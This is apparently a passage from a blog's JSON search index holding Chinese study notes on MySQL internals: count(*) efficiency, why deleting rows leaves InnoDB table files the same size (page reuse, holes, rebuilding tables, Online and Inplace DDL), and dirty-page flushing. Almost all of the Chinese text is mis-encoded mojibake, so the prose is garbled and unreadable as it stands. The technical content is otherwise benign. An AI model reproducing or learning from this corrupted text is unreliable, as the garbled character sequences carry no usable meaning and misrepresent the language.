ä¹Ÿå°±æ˜¯å‰é¢çš„ç¬¬ä¸€æ¡åŸåˆ™ï¼Œserver å±‚è¦ä»€ä¹ˆå­—æ®µï¼ŒInnoDB å°±è¿”å›ä»€ä¹ˆå­—æ®µã€‚ ä½†æ˜¯ count(*) æ˜¯ä¾‹å¤–ï¼Œå¹¶ä¸ä¼šæŠŠå…¨éƒ¨å­—æ®µå–å‡ºæ¥ï¼Œè€Œæ˜¯ä¸“é—¨åšäº†ä¼˜åŒ–ï¼Œä¸å–å€¼ã€‚count(*) è‚¯å®šä¸æ˜¯ nullï¼ŒæŒ‰è¡Œç´¯åŠ ã€‚ çœ‹åˆ°è¿™é‡Œï¼Œä½ ä¸€å®šä¼šè¯´ï¼Œä¼˜åŒ–å™¨å°±ä¸èƒ½è‡ªå·±åˆ¤æ–­ä¸€ä¸‹å—ï¼Œä¸»é”® id è‚¯å®šéç©ºå•Šï¼Œä¸ºä»€ä¹ˆä¸èƒ½æŒ‰ç…§ count(*) æ¥å¤„ç†ï¼Œå¤šä¹ˆç®€å•çš„ä¼˜åŒ–å•Šã€‚ å½“ç„¶ï¼ŒMySQL ä¸“é—¨é’ˆå¯¹è¿™ä¸ªè¯­å¥è¿›è¡Œä¼˜åŒ–ï¼Œä¹Ÿä¸æ˜¯ä¸å¯ä»¥ã€‚ä½†æ˜¯è¿™ç§éœ€è¦ä¸“é—¨ä¼˜åŒ–çš„æƒ…å†µå¤ªå¤šäº†ï¼Œè€Œä¸” MySQL å·²ç»ä¼˜åŒ–è¿‡ count(*) äº†ï¼Œä½ ç›´æ¥ä½¿ç”¨è¿™ç§ç”¨æ³•å°±å¯ä»¥äº†ã€‚ æ‰€ä»¥ç»“è®ºæ˜¯ï¼šæŒ‰ç…§æ•ˆç‡æ’åºçš„è¯ï¼Œcount(å­—æ®µ)&lt;count(ä¸»é”® id)&lt;count(1)â‰ˆcount(*)ï¼Œæ‰€ä»¥æˆ‘å»ºè®®ä½ ï¼Œå°½é‡ä½¿ç”¨ count(*)ã€‚ æ€»ç»“ æŒ‰ç…§æ•ˆç‡æ’åºçš„è¯ï¼Œcount(å­—æ®µ)&lt;count(ä¸»é”® id)&lt;count(1)â‰ˆcount(*)ï¼Œå»ºè®®ä½¿ç”¨ count(*)","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"13 ä¸ºä»€ä¹ˆè¡¨æ•°æ®åˆ æ‰ä¸€åŠï¼Œè¡¨æ–‡ä»¶å¤§å°ä¸å˜","slug":"why-is-half-of-the-table-data-deleted-but-the-table-file-size-remains-the-same","date":"2022-06-23T14:29:12.000Z","updated":"2022-06-27T08:17:37.105Z","comments":true,"path":"why-is-half-of-the-table-data-deleted-but-the-table-file-size-remains-the-same/","link":"","permalink":"https://www.0x2beace.com/why-is-half-of-the-table-data-deleted-but-the-table-file-size-remains-the-same/","excerpt":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š äº†è§£ Mysql çš„innodb_file_per_table å‚æ•° äº†è§£ Mysql æ•°æ®åˆ é™¤æµç¨‹ åŒºåˆ† Online å’Œ Inplace","text":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š äº†è§£ Mysql çš„innodb_file_per_table å‚æ•° äº†è§£ Mysql æ•°æ®åˆ é™¤æµç¨‹ åŒºåˆ† Online å’Œ Inplace å‚æ•° innodb_file_per_tableè¡¨æ•°æ®æ—¢å¯ä»¥å­˜åœ¨å…±äº«è¡¨ç©ºé—´é‡Œï¼Œä¹Ÿå¯ä»¥æ˜¯å•ç‹¬çš„æ–‡ä»¶ã€‚è¿™ä¸ªè¡Œä¸ºæ˜¯ç”±å‚æ•° innodb_file_per_table æ§åˆ¶çš„ï¼š è¿™ä¸ªå‚æ•°è®¾ç½®ä¸º OFF è¡¨ç¤ºçš„æ˜¯ï¼Œè¡¨çš„æ•°æ®æ”¾åœ¨ç³»ç»Ÿå…±äº«è¡¨ç©ºé—´ï¼Œä¹Ÿå°±æ˜¯è·Ÿæ•°æ®å­—å…¸æ”¾åœ¨ä¸€èµ· è¿™ä¸ªå‚æ•°è®¾ç½®ä¸º ON è¡¨ç¤ºçš„æ˜¯ï¼Œæ¯ä¸ª InnoDB è¡¨æ•°æ®å­˜å‚¨åœ¨ä¸€ä¸ªä»¥ .ibd ä¸ºåç¼€çš„æ–‡ä»¶ä¸­ ä» MySQL 5.6.6 ç‰ˆæœ¬å¼€å§‹ï¼Œå®ƒçš„é»˜è®¤å€¼å°±æ˜¯ ON äº†ã€‚ å»ºè®®ä¸è®ºä½¿ç”¨ MySQL çš„å“ªä¸ªç‰ˆæœ¬ï¼Œéƒ½å°†è¿™ä¸ªå€¼è®¾ç½®ä¸º ONã€‚ å› ä¸ºï¼Œä¸€ä¸ªè¡¨å•ç‹¬å­˜å‚¨ä¸ºä¸€ä¸ªæ–‡ä»¶æ›´å®¹æ˜“ç®¡ç†ï¼Œè€Œä¸”åœ¨ä½ ä¸éœ€è¦è¿™ä¸ªè¡¨çš„æ—¶å€™ï¼Œé€šè¿‡ drop table å‘½ä»¤ï¼Œç³»ç»Ÿå°±ä¼šç›´æ¥åˆ é™¤è¿™ä¸ªæ–‡ä»¶ã€‚è€Œå¦‚æœæ˜¯æ”¾åœ¨å…±äº«è¡¨ç©ºé—´ä¸­ï¼Œå³ä½¿è¡¨åˆ æ‰äº†ï¼Œç©ºé—´ä¹Ÿæ˜¯ä¸ä¼šå›æ”¶çš„ã€‚ æ•°æ®åˆ é™¤æµç¨‹B + æ ‘ç´¢å¼•ç¤ºæ„å›¾ï¼š å‡è®¾ï¼Œæˆ‘ä»¬è¦åˆ æ‰ R4 è¿™ä¸ªè®°å½•ï¼ŒInnoDB å¼•æ“åªä¼šæŠŠ R4 è¿™ä¸ªè®°å½•æ ‡è®°ä¸ºåˆ é™¤ã€‚å¦‚æœä¹‹åè¦å†æ’å…¥ä¸€ä¸ª ID åœ¨ 300 å’Œ 600 ä¹‹é—´çš„è®°å½•æ—¶ï¼Œå¯èƒ½ä¼šå¤ç”¨è¿™ä¸ªä½ç½®ã€‚ä½†æ˜¯ï¼Œç£ç›˜æ–‡ä»¶çš„å¤§å°å¹¶ä¸ä¼šç¼©å°ã€‚ åœ¨ InnoBD ä¸­ï¼Œæ•°æ®æ˜¯æŒ‰é¡µè¿›è¡Œå­˜å‚¨çš„ï¼Œå¦‚æœæˆ‘ä»¬åˆ æ‰äº†ä¸€ä¸ªæ•°æ®é¡µä¸Šçš„æ‰€æœ‰è®°å½•ï¼Œä¼šæ€ä¹ˆæ ·ï¼Ÿ ç­”æ¡ˆæ˜¯ï¼Œæ•´ä¸ªæ•°æ®é¡µå°±å¯ä»¥è¢«å¤ç”¨äº†ã€‚ ä½†æ˜¯ï¼Œæ•°æ®é¡µçš„å¤ç”¨è·Ÿè®°å½•çš„å¤ç”¨æ˜¯ä¸åŒçš„ã€‚ è®°å½•çš„å¤ç”¨ï¼Œåªé™äºç¬¦åˆèŒƒå›´æ¡ä»¶çš„æ•°æ®ã€‚æ¯”å¦‚ä¸Šé¢çš„è¿™ä¸ªä¾‹å­ï¼ŒR4 è¿™æ¡è®°å½•è¢«åˆ é™¤åï¼Œå¦‚æœæ’å…¥ä¸€ä¸ª ID æ˜¯ 400 çš„è¡Œï¼Œå¯ä»¥ç›´æ¥å¤ç”¨è¿™ä¸ªç©ºé—´ã€‚ä½†å¦‚æœæ’å…¥çš„æ˜¯ä¸€ä¸ª ID æ˜¯ 800 çš„è¡Œï¼Œå°±ä¸èƒ½å¤ç”¨è¿™ä¸ªä½ç½®äº†ã€‚ æ•°æ®é¡µçš„å¤ç”¨ï¼Œå½“æ•´ä¸ªé¡µä» B+ æ ‘é‡Œé¢æ‘˜æ‰ä»¥åï¼Œå¯ä»¥å¤ç”¨åˆ°ä»»ä½•ä½ç½®ã€‚ä»¥ä¸Šå›¾ä¸ºä¾‹ï¼Œå¦‚æœå°†æ•°æ®é¡µ page A ä¸Šçš„æ‰€æœ‰è®°å½•åˆ é™¤ä»¥åï¼Œpage A ä¼šè¢«æ ‡è®°ä¸ºå¯å¤ç”¨ã€‚è¿™æ—¶å€™å¦‚æœè¦æ’å…¥ä¸€æ¡ ID=50 çš„è®°å½•éœ€è¦ä½¿ç”¨æ–°é¡µçš„æ—¶å€™ï¼Œpage A æ˜¯å¯ä»¥è¢«å¤ç”¨çš„ã€‚ å¦‚æœç›¸é‚»çš„ä¸¤ä¸ªæ•°æ®é¡µåˆ©ç”¨ç‡éƒ½å¾ˆå°ï¼Œç³»ç»Ÿå°±ä¼šæŠŠè¿™ä¸¤ä¸ªé¡µä¸Šçš„æ•°æ®åˆåˆ°å…¶ä¸­ä¸€ä¸ªé¡µä¸Šï¼Œå¦å¤–ä¸€ä¸ªæ•°æ®é¡µå°±è¢«æ ‡è®°ä¸ºå¯å¤ç”¨ã€‚ è¿›ä¸€æ­¥åœ°ï¼Œå¦‚æœæˆ‘ä»¬ç”¨ delete å‘½ä»¤æŠŠæ•´ä¸ªè¡¨çš„æ•°æ®åˆ é™¤å‘¢ï¼Ÿç»“æœå°±æ˜¯ï¼Œæ‰€æœ‰çš„æ•°æ®é¡µéƒ½ä¼šè¢«æ ‡è®°ä¸ºå¯å¤ç”¨ã€‚ä½†æ˜¯ç£ç›˜ä¸Šï¼Œæ–‡ä»¶ä¸ä¼šå˜å°ã€‚ ä½ ç°åœ¨çŸ¥é“äº†ï¼Œdelete å‘½ä»¤å…¶å®åªæ˜¯æŠŠè®°å½•çš„ä½ç½®ï¼Œæˆ–è€…æ•°æ®é¡µæ ‡è®°ä¸ºäº†â€œå¯å¤ç”¨â€ï¼Œä½†ç£ç›˜æ–‡ä»¶çš„å¤§å°æ˜¯ä¸ä¼šå˜çš„ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œé€šè¿‡ delete å‘½ä»¤æ˜¯ä¸èƒ½å›æ”¶è¡¨ç©ºé—´çš„ã€‚è¿™äº›å¯ä»¥å¤ç”¨ï¼Œè€Œæ²¡æœ‰è¢«ä½¿ç”¨çš„ç©ºé—´ï¼Œçœ‹èµ·æ¥å°±åƒæ˜¯â€œç©ºæ´â€ã€‚ å®é™…ä¸Šï¼Œä¸æ­¢æ˜¯åˆ é™¤æ•°æ®ä¼šé€ æˆç©ºæ´ï¼Œæ’å…¥æ•°æ®ä¹Ÿä¼šã€‚ å¦‚æœæ•°æ®æ˜¯æŒ‰ç…§ç´¢å¼•é€’å¢é¡ºåºæ’å…¥çš„ï¼Œé‚£ä¹ˆç´¢å¼•æ˜¯ç´§å‡‘çš„ã€‚ä½†å¦‚æœæ•°æ®æ˜¯éšæœºæ’å…¥çš„ï¼Œå°±å¯èƒ½é€ æˆç´¢å¼•çš„æ•°æ®é¡µåˆ†è£‚ã€‚ å‡è®¾å›¾ 1 ä¸­ page A å·²ç»æ»¡äº†ï¼Œè¿™æ—¶æˆ‘è¦å†æ’å…¥ä¸€è¡Œæ•°æ®ï¼Œä¼šæ€æ ·å‘¢ï¼Ÿ å¯ä»¥çœ‹åˆ°ï¼Œç”±äº page A æ»¡äº†ï¼Œå†æ’å…¥ä¸€ä¸ª ID æ˜¯ 550 çš„æ•°æ®æ—¶ï¼Œå°±ä¸å¾—ä¸å†ç”³è¯·ä¸€ä¸ªæ–°çš„é¡µé¢ page B æ¥ä¿å­˜æ•°æ®äº†ã€‚é¡µåˆ†è£‚å®Œæˆåï¼Œpage A çš„æœ«å°¾å°±ç•™ä¸‹äº†ç©ºæ´ï¼ˆæ³¨æ„ï¼šå®é™…ä¸Šï¼Œå¯èƒ½ä¸æ­¢ 1 ä¸ªè®°å½•çš„ä½ç½®æ˜¯ç©ºæ´ï¼‰ã€‚ å¦å¤–ï¼Œæ›´æ–°ç´¢å¼•ä¸Šçš„å€¼ï¼Œå¯ä»¥ç†è§£ä¸ºåˆ é™¤ä¸€ä¸ªæ—§çš„å€¼ï¼Œå†æ’å…¥ä¸€ä¸ªæ–°å€¼ã€‚ä¸éš¾ç†è§£ï¼Œè¿™ä¹Ÿæ˜¯ä¼šé€ æˆç©ºæ´çš„ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œç»è¿‡å¤§é‡å¢åˆ æ”¹çš„è¡¨ï¼Œéƒ½æ˜¯å¯èƒ½æ˜¯å­˜åœ¨ç©ºæ´çš„ã€‚æ‰€ä»¥ï¼Œå¦‚æœèƒ½å¤ŸæŠŠè¿™äº›ç©ºæ´å»æ‰ï¼Œå°±èƒ½è¾¾åˆ°æ”¶ç¼©è¡¨ç©ºé—´çš„ç›®çš„ã€‚ è€Œé‡å»ºè¡¨ï¼Œå°±å¯ä»¥è¾¾åˆ°è¿™æ ·çš„ç›®çš„ã€‚ é‡å»ºè¡¨å¯ä»¥æ–°å»ºä¸€ä¸ªä¸è¡¨ A ç»“æ„ç›¸åŒçš„è¡¨ Bï¼Œç„¶åæŒ‰ç…§ä¸»é”® ID é€’å¢çš„é¡ºåºï¼ŒæŠŠæ•°æ®ä¸€è¡Œä¸€è¡Œåœ°ä»è¡¨ A é‡Œè¯»å‡ºæ¥å†æ’å…¥åˆ°è¡¨ B ä¸­ã€‚ ç”±äºè¡¨ B æ˜¯æ–°å»ºçš„è¡¨ï¼Œæ‰€ä»¥è¡¨ A ä¸»é”®ç´¢å¼•ä¸Šçš„ç©ºæ´ï¼Œåœ¨è¡¨ B ä¸­å°±éƒ½ä¸å­˜åœ¨äº†ã€‚æ˜¾ç„¶åœ°ï¼Œè¡¨ B çš„ä¸»é”®ç´¢å¼•æ›´ç´§å‡‘ï¼Œæ•°æ®é¡µçš„åˆ©ç”¨ç‡ä¹Ÿæ›´é«˜ã€‚å¦‚æœæˆ‘ä»¬æŠŠè¡¨ B ä½œä¸ºä¸´æ—¶è¡¨ï¼Œæ•°æ®ä»è¡¨ A å¯¼å…¥è¡¨ B çš„æ“ä½œå®Œæˆåï¼Œç”¨è¡¨ B æ›¿æ¢ Aï¼Œä»æ•ˆæœä¸Šçœ‹ï¼Œå°±èµ·åˆ°äº†æ”¶ç¼©è¡¨ A ç©ºé—´çš„ä½œç”¨ã€‚ å¯ä»¥ä½¿ç”¨ alter table A engine=InnoDB å‘½ä»¤æ¥é‡å»ºè¡¨ã€‚åœ¨ MySQL 5.5 ç‰ˆæœ¬ä¹‹å‰ï¼Œè¿™ä¸ªå‘½ä»¤çš„æ‰§è¡Œæµç¨‹è·Ÿæˆ‘ä»¬å‰é¢æè¿°çš„å·®ä¸å¤šï¼ŒåŒºåˆ«åªæ˜¯è¿™ä¸ªä¸´æ—¶è¡¨ B ä¸éœ€è¦ä½ è‡ªå·±åˆ›å»ºï¼ŒMySQL ä¼šè‡ªåŠ¨å®Œæˆè½¬å­˜æ•°æ®ã€äº¤æ¢è¡¨åã€åˆ é™¤æ—§è¡¨çš„æ“ä½œã€‚ ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨æ•´ä¸ª DDL è¿‡ç¨‹ä¸­ï¼Œè¡¨ A ä¸­ä¸èƒ½æœ‰æ›´æ–°ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™ä¸ª DDL ä¸æ˜¯ Online çš„ã€‚ Online å’Œ Inplaceå¦ä¸€ä¸ªè·Ÿ Online æœ‰å…³ï¼Œ æ¯”è¾ƒå®¹æ˜“æ··æ·†çš„æ¦‚å¿µæ˜¯ Inplaceã€‚ åœ¨ä¸Šé¢çš„é‡å»ºè¡¨çš„è¿‡ç¨‹ä¸­ï¼Œé‡å»ºå‡ºæ¥çš„æ•°æ®ä¼šæ”¾åœ¨â€œtmp_fileâ€ ä¸´æ—¶æ–‡ä»¶ä¸­ï¼Œè¿™ä¸ªä¸´æ—¶æ–‡ä»¶æ˜¯ InnoDB åœ¨å†…éƒ¨åˆ›å»ºå‡ºæ¥çš„ã€‚æ•´ä¸ª DDL è¿‡ç¨‹éƒ½åœ¨ InnoDB å†…éƒ¨å®Œæˆã€‚ å¯¹äº server å±‚æ¥è¯´ï¼Œæ²¡æœ‰æŠŠæ•°æ®æŒªåŠ¨åˆ°ä¸´æ—¶è¡¨ï¼Œæ˜¯ä¸€ä¸ªâ€œåŸåœ°â€æ“ä½œï¼Œè¿™å°±æ˜¯â€œInplaceâ€åç§°çš„æ¥æºã€‚ æ‰€ä»¥ï¼Œæˆ‘ç°åœ¨é—®ä½ ï¼Œå¦‚æœä½ æœ‰ä¸€ä¸ª 1TB çš„è¡¨ï¼Œç°åœ¨ç£ç›˜é—´æ˜¯ 1.2TBï¼Œèƒ½ä¸èƒ½åšä¸€ä¸ª Inplace çš„ DDL å‘¢ï¼Ÿ ç­”æ¡ˆæ˜¯ä¸èƒ½ã€‚å› ä¸ºï¼Œtmp_file ä¹Ÿæ˜¯è¦å ç”¨ä¸´æ—¶ç©ºé—´çš„ã€‚ Online å’Œ Inplace è¿™ä¸¤ä¸ªé€»è¾‘ä¹‹é—´çš„å…³ç³»æ˜¯ä»€ä¹ˆï¼Ÿ DDL è¿‡ç¨‹å¦‚æœæ˜¯ Online çš„ï¼Œå°±ä¸€å®šæ˜¯ inplace çš„ åè¿‡æ¥æœªå¿…ï¼Œä¹Ÿå°±æ˜¯è¯´ inplace çš„ DDLï¼Œæœ‰å¯èƒ½ä¸æ˜¯ Online çš„ã€‚æˆªæ­¢åˆ° MySQL 8.0ï¼Œæ·»åŠ å…¨æ–‡ç´¢å¼•ï¼ˆFULLTEXT indexï¼‰å’Œç©ºé—´ç´¢å¼• (SPATIAL index) å°±å±äºè¿™ç§æƒ…å†µ æ€»ç»“ åªæ˜¯ delete æ‰è¡¨é‡Œé¢ä¸ç”¨çš„æ•°æ®çš„è¯ï¼Œè¡¨æ–‡ä»¶çš„å¤§å°æ˜¯ä¸ä¼šå˜çš„ drop table å‘½ä»¤å¯ä»¥å›æ”¶è¡¨ç©ºé—´ï¼Œä½†æ˜¯ä¼šæŠŠè¡¨ç»“æ„å®šä¹‰å’Œæ•°æ®å…¨éƒ¨åˆ æ‰ å¦‚æœå¸Œæœ›åœ¨ä¿ç•™è¡¨ç»“æ„ä»¥åŠæ•°æ®çš„æƒ…å†µä¸‹ï¼Œè¿˜èƒ½å›æ”¶è¡¨ç©ºé—´ï¼Œé‚£ä¹ˆå¯ä»¥è€ƒè™‘é‡å»ºè¡¨ ä½¿ç”¨ alter table é‡å»ºè¡¨ï¼Œæœ‰ä¸¤ç§æ–¹å¼ï¼š alter table t engine=innodb,ALGORITHM=copy;ï¼šè¿™ä¸ª DDL ä¸æ˜¯ Online çš„ alter table t engine=innodb,ALGORITHM=inplace;ï¼šè¿™ä¸ª DDL æ˜¯ Online çš„ Mysql 5.6 ä¹‹åï¼Œé™¤äº†å¢åŠ åŠ å…¨æ–‡ç´¢å¼•ä¸æ˜¯ onlineï¼Œå…¶ä»– alter æ“ä½œ(å¢åˆ å­—æ®µã€å¢åˆ ç´¢å¼•ç­‰)éƒ½æ˜¯æ”¯æŒ online ddl","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"12 ä¸ºä»€ä¹ˆæˆ‘çš„ Mysql ä¼šæŠ–ä¸€ä¸‹","slug":"why-does-my-mysql-shake","date":"2022-06-22T15:45:15.000Z","updated":"2022-06-27T08:17:37.105Z","comments":true,"path":"why-does-my-mysql-shake/","link":"","permalink":"https://www.0x2beace.com/why-does-my-mysql-shake/","excerpt":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š äº†è§£è„é¡µä¸å¹²å‡€é¡µçš„æ¦‚å¿µ äº†è§£InnoDB åˆ·è„é¡µçš„æ§åˆ¶ç­–ç•¥","text":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š äº†è§£è„é¡µä¸å¹²å‡€é¡µçš„æ¦‚å¿µ äº†è§£InnoDB åˆ·è„é¡µçš„æ§åˆ¶ç­–ç•¥ ä½ çš„ SQL è¯­å¥ä¸ºä»€ä¹ˆå˜â€œæ…¢â€äº†å½“å†…å­˜æ•°æ®é¡µè·Ÿç£ç›˜æ•°æ®é¡µå†…å®¹ä¸ä¸€è‡´çš„æ—¶å€™ï¼Œæˆ‘ä»¬ç§°è¿™ä¸ªå†…å­˜é¡µä¸ºâ€œè„é¡µâ€ã€‚å†…å­˜æ•°æ®å†™å…¥åˆ°ç£ç›˜åï¼Œå†…å­˜å’Œç£ç›˜ä¸Šçš„æ•°æ®é¡µçš„å†…å®¹å°±ä¸€è‡´äº†ï¼Œç§°ä¸ºâ€œå¹²å‡€é¡µâ€ã€‚ ä¸è®ºæ˜¯è„é¡µè¿˜æ˜¯å¹²å‡€é¡µï¼Œéƒ½åœ¨å†…å­˜ä¸­ã€‚ æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ç”¨ä¸€ä¸ªç¤ºæ„å›¾æ¥å±•ç¤ºä¸€ä¸‹â€œå­”ä¹™å·±èµŠè´¦â€çš„æ•´ä¸ªæ“ä½œè¿‡ç¨‹ã€‚å‡è®¾åŸæ¥å­”ä¹™å·±æ¬ è´¦ 10 æ–‡ï¼Œè¿™æ¬¡åˆè¦èµŠ 9 æ–‡ã€‚ å›åˆ°æ–‡ç« å¼€å¤´çš„é—®é¢˜ï¼Œä½ ä¸éš¾æƒ³è±¡ï¼Œå¹³æ—¶æ‰§è¡Œå¾ˆå¿«çš„æ›´æ–°æ“ä½œï¼Œå…¶å®å°±æ˜¯åœ¨å†™å†…å­˜å’Œæ—¥å¿—ï¼Œè€Œ MySQL å¶å°”â€œæŠ–â€ä¸€ä¸‹çš„é‚£ä¸ªç¬é—´ï¼Œå¯èƒ½å°±æ˜¯åœ¨åˆ·è„é¡µï¼ˆflushï¼‰ã€‚ é‚£ä¹ˆï¼Œä»€ä¹ˆæƒ…å†µä¼šå¼•å‘æ•°æ®åº“çš„ flush è¿‡ç¨‹å‘¢ï¼Ÿ æˆ‘ä»¬è¿˜æ˜¯ç»§ç»­ç”¨å’¸äº¨é…’åº—æŒæŸœçš„è¿™ä¸ªä¾‹å­ï¼Œæƒ³ä¸€æƒ³ï¼šæŒæŸœåœ¨ä»€ä¹ˆæƒ…å†µä¸‹ä¼šæŠŠç²‰æ¿ä¸Šçš„èµŠè´¦è®°å½•æ”¹åˆ°è´¦æœ¬ä¸Šï¼Ÿ ç¬¬ä¸€ç§åœºæ™¯æ˜¯ï¼Œç²‰æ¿æ»¡äº†ï¼Œè®°ä¸ä¸‹äº†ã€‚è¿™æ—¶å€™å¦‚æœå†æœ‰äººæ¥èµŠè´¦ï¼ŒæŒæŸœå°±åªå¾—æ”¾ä¸‹æ‰‹é‡Œçš„æ´»å„¿ï¼Œå°†ç²‰æ¿ä¸Šçš„è®°å½•æ“¦æ‰ä¸€äº›ï¼Œç•™å‡ºç©ºä½ä»¥ä¾¿ç»§ç»­è®°è´¦ã€‚å½“ç„¶åœ¨æ“¦æ‰ä¹‹å‰ï¼Œä»–å¿…é¡»å…ˆå°†æ­£ç¡®çš„è´¦ç›®è®°å½•åˆ°è´¦æœ¬ä¸­æ‰è¡Œã€‚ è¿™ä¸ªåœºæ™¯ï¼Œå¯¹åº”çš„å°±æ˜¯ InnoDB çš„ redo log å†™æ»¡äº†ã€‚è¿™æ—¶å€™ç³»ç»Ÿä¼šåœæ­¢æ‰€æœ‰æ›´æ–°æ“ä½œï¼ŒæŠŠ checkpoint å¾€å‰æ¨è¿›ï¼Œredo log ç•™å‡ºç©ºé—´å¯ä»¥ç»§ç»­å†™ã€‚æˆ‘åœ¨ç¬¬äºŒè®²ç”»äº†ä¸€ä¸ª redo log çš„ç¤ºæ„å›¾ï¼Œè¿™é‡Œæˆ‘æ”¹æˆç¯å½¢ï¼Œä¾¿äºå¤§å®¶ç†è§£ã€‚ ç¬¬äºŒç§åœºæ™¯æ˜¯ï¼Œè¿™ä¸€å¤©ç”Ÿæ„å¤ªå¥½ï¼Œè¦è®°ä½çš„äº‹æƒ…å¤ªå¤šï¼ŒæŒæŸœå‘ç°è‡ªå·±å¿«è®°ä¸ä½äº†ï¼Œèµ¶ç´§æ‰¾å‡ºè´¦æœ¬æŠŠå­”ä¹™å·±è¿™ç¬”è´¦å…ˆåŠ è¿›å»ã€‚ è¿™ç§åœºæ™¯ï¼Œå¯¹åº”çš„å°±æ˜¯ç³»ç»Ÿå†…å­˜ä¸è¶³ã€‚å½“éœ€è¦æ–°çš„å†…å­˜é¡µï¼Œè€Œå†…å­˜ä¸å¤Ÿç”¨çš„æ—¶å€™ï¼Œå°±è¦æ·˜æ±°ä¸€äº›æ•°æ®é¡µï¼Œç©ºå‡ºå†…å­˜ç»™åˆ«çš„æ•°æ®é¡µä½¿ç”¨ã€‚å¦‚æœæ·˜æ±°çš„æ˜¯â€œè„é¡µâ€ï¼Œå°±è¦å…ˆå°†è„é¡µå†™åˆ°ç£ç›˜ã€‚ è¿™ä¸ªæ—¶å€™èƒ½å¦ç›´æ¥æŠŠå†…å­˜æ·˜æ±°æ‰ï¼Œä¸‹æ¬¡éœ€è¦è¯·æ±‚çš„æ—¶å€™ï¼Œä»ç£ç›˜è¯»å…¥æ•°æ®é¡µï¼Œç„¶åæ‹¿ redo log å‡ºæ¥åº”ç”¨ï¼Ÿ è¿™é‡Œå…¶å®æ˜¯ä»æ€§èƒ½è€ƒè™‘çš„ã€‚å¦‚æœåˆ·è„é¡µä¸€å®šä¼šå†™ç›˜ï¼Œå°±ä¿è¯äº†æ¯ä¸ªæ•°æ®é¡µæœ‰ä¸¤ç§çŠ¶æ€ï¼š ä¸€ç§æ˜¯å†…å­˜é‡Œå­˜åœ¨ï¼Œå†…å­˜é‡Œå°±è‚¯å®šæ˜¯æ­£ç¡®çš„ç»“æœï¼Œç›´æ¥è¿”å›ï¼› å¦ä¸€ç§æ˜¯å†…å­˜é‡Œæ²¡æœ‰æ•°æ®ï¼Œå°±å¯ä»¥è‚¯å®šæ•°æ®æ–‡ä»¶ä¸Šæ˜¯æ­£ç¡®çš„ç»“æœï¼Œè¯»å…¥å†…å­˜åè¿”å›ã€‚è¿™æ ·çš„æ•ˆç‡æœ€é«˜ã€‚ ç¬¬ä¸‰ç§åœºæ™¯æ˜¯ï¼Œç”Ÿæ„ä¸å¿™çš„æ—¶å€™ï¼Œæˆ–è€…æ‰“çƒŠä¹‹åã€‚è¿™æ—¶å€™æŸœå°æ²¡äº‹ï¼ŒæŒæŸœé—²ç€ä¹Ÿæ˜¯é—²ç€ï¼Œä¸å¦‚æ›´æ–°è´¦æœ¬ã€‚ è¿™ç§åœºæ™¯ï¼Œå¯¹åº”çš„å°±æ˜¯ MySQL è®¤ä¸ºç³»ç»Ÿâ€œç©ºé—²â€çš„æ—¶å€™ã€‚å½“ç„¶ï¼ŒMySQLâ€œè¿™å®¶é…’åº—â€çš„ç”Ÿæ„å¥½èµ·æ¥å¯æ˜¯ä¼šå¾ˆå¿«å°±èƒ½æŠŠç²‰æ¿è®°æ»¡çš„ï¼Œæ‰€ä»¥â€œæŒæŸœâ€è¦åˆç†åœ°å®‰æ’æ—¶é—´ï¼Œå³ä½¿æ˜¯â€œç”Ÿæ„å¥½â€çš„æ—¶å€™ï¼Œä¹Ÿè¦è§ç¼æ’é’ˆåœ°æ‰¾æ—¶é—´ï¼Œåªè¦æœ‰æœºä¼šå°±åˆ·ä¸€ç‚¹â€œè„é¡µâ€ã€‚ ç¬¬å››ç§åœºæ™¯æ˜¯ï¼Œå¹´åº•äº†å’¸äº¨é…’åº—è¦å…³é—¨å‡ å¤©ï¼Œéœ€è¦æŠŠè´¦ç»“æ¸…ä¸€ä¸‹ã€‚è¿™æ—¶å€™æŒæŸœè¦æŠŠæ‰€æœ‰è´¦éƒ½è®°åˆ°è´¦æœ¬ä¸Šï¼Œè¿™æ ·è¿‡å®Œå¹´é‡æ–°å¼€å¼ 